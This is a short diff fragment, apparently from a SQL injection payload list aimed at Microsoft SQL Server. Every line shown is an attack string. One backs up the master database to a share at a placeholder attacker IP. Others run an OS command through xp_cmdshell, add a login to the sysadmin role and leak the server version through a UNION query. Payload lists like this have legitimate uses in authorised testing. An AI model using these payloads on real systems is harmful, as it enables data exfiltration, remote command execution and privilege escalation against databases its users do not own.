@@ -3,4 +3,3 @@ BACKUP database master to disks='\<attackerip><attackerip>\backupdb.dat'
 '; exec master..xp_cmdshell 'ping 10.10.1.2'--
 ' exec sp_addsrvrolemember 'name' , 'sysadmin' --
 ' union (select NULL, NULL, NULL,  (select @@version)) --
-    
